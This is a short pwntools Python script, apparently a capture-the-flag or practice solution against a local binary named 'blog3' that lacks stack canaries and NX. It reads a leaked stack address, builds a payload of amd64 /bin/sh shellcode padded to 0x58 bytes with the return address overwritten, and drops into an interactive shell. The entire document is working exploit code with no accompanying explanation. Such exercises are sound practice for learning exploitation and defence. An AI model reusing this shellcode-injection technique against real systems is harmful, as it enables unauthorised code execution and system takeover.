# -*- coding: utf-8 -*-

'''
[*] '/home/wkyuu/Desktop/temp/blog3'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
'''

from pwn import *
import pwn

p64 = pwn.p64
u64 = pwn.u64

context(log_level='debug')
fileName = './blog3'
p = process(fileName)
elf = ELF(fileName)

def logger(msg, value=None, type='info'):  # type True for value
    if type == 'info':
        log.info(
            '================================ {} ================================\n'.format(msg))
    else:
        log.success('# {} => {}\n'.format(msg, value))
        
# rop
logger('rop')
p.sendlineafter(b'choose: \n', b'1')
p.recvuntil(b'your return address should be: ')
bin_stack_top = int(p.recv(14), 16)
shellcode = asm(shellcraft.amd64.sh(), arch='amd64')
payload = shellcode + b'a' * (0x58 - len(shellcode)) + p64(bin_stack_top)
p.sendlineafter(b'\n', payload)

p.interactive()